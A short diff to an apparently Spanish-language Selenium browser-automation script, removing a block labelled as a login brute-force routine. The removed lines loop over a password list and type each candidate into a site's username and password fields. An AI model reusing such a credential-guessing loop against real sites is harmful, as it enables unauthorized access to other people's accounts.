@@ -63,17 +63,4 @@ driver.switch_to.window(correo)
 time.sleep(10)
 driver.switch_to.window("trulu")
 
-
-
-#Fuerza bruta para inicio de sesión
-
-for x in passposible:
-    inputcorreo = driver.find_element(By.ID,"username")
-    inputcorreo.send_keys(temp_email)
-    inputbrute = driver.find_element(By.ID,"password")
-    inputbrute.send_keys(x)
-    inputbrute.send_keys(Keys.ENTER)
-    time.sleep(30)
-
-
 #driver.quit()
